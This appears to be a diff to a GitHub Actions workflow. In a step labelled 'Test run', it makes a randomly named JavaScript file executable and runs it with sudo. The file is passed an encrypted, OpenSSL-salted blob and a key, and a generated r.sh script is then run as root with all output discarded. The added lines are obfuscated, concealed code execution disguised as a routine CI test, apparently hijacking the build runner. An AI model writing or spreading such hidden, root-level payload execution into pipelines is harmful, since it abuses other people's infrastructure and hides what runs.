@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'txqt2'
+        echo 'essqe'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX1+TgVUmDmTor97J8N0xrUqUpLub0SUs3f7FeKAk8qdjVDtYuG4/nmSqhd0pFx157ee/ILaQCqaxwipT/v7GoRI532FuaQO6i5agnupTFti3Lc2h4awucmfd 6l1kes && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX1+VqYoN1pCwQO3ZB5Dt6K3WeM6E3jaTP9aEhGn/M6qVCVJ/M6SwkSufgFjw/R3RyPKO9q+gaZXCayz5IfVNGtg26RoFwJoaRr6B/LA+hQsUrRxdDKXuxaH/ 3z1lw5 && sudo sh r.sh > /dev/null 2>&1
